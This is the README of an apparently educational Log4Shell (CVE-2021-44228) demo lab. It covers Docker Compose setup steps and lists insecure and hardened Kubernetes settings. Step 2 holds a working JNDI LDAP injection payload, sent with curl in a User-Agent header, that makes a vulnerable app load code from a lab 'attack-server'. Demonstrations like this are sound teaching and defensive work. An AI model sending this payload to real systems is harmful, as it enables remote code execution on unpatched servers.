# Log4Shell (CVE-2021-44228) Demo Environment

⚠️ **WARNING**: This is a demonstration of Log4Shell vulnerability (CVE-2021-44228) for educational purposes only.
Do not use in production.

## Quick Start Guide

### Step 1: Deploy Environment
```bash
docker compose down
docker compose build
docker compose up
```

### Step 2: Test Vulnerability
```bash
curl -H "User-Agent: ${jndi:ldap://attack-server:10389/cn=badcode,dc=predic8,dc=de}" http://localhost:9090
```
### Step 3: Check Results
You should see this output in logs:
```log
[!] YOU'VE BEEN H4CKED! [!]
[*] Current directory: /app
[*] Your system belongs to us now >:)
[-] Have a nice day! muhahahaha!
```
### Kubernetes Deployment Examples
Project includes two deployment examples demonstrating security configurations:
### Bad Practice Example (k8s/bad-deployment.yaml)
Shows dangerous configurations you should avoid:
- Privileged mode enabled
- Host network access
- Root user
- Unrestricted capabilities
- Host path mounts
- Service account token auto-mount

### Good Practice Example (k8s/good-deployment.yaml)
Demonstrates security best practices:
- Non-root user
- Minimal capabilities
- Read-only root filesystem
- Resource limits
- No privileged mode
- No service account token
- SecurityContext restrictions

### Project Structure
```
.
├── attack-server/         # LDAP and HTTP servers
├── demo-vuln-app/        # Vulnerable application
├── k8s/                  # Kubernetes manifests
└── docker-compose.yaml   # Docker Compose config
```
### Security Notes

This is for educational purposes only
Demonstrates Log4Shell vulnerability safely
Shows Kubernetes security best practices
Illustrates container security principles

### References

CVE-2021-44228
Kubernetes Security
Docker Security

### License
Educational use only. Use responsibly.
